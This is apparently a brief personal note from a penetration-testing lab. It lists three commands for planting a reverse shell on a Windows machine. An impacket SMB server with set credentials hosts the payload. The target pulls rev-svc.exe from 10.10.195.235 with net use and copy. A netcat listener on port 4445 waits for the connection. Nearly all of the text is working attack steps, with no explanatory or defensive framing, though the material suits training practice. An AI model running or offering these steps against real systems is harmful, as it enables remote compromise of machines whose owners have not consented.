1. Send the reverse shell to the target machine
   python3 /opt/impacket/examples/smbserver.py -smb2support -username user -password Pass123 public /root/Desktop/
   ![[Pasted image 20250831123322.png]]
2. Download it on target machine
   
   *Windows*
   net use \\\10.10.195.235\public /user:user Pass123
   copy \\\\10.10.195.235\public\rev-svc.exe rev.exe

3. Start listening on the attack machine
   nc -lvnp 4445   ![[Pasted image 20250831123638.png]]



---

![[Pasted image 20250910233855.png]]

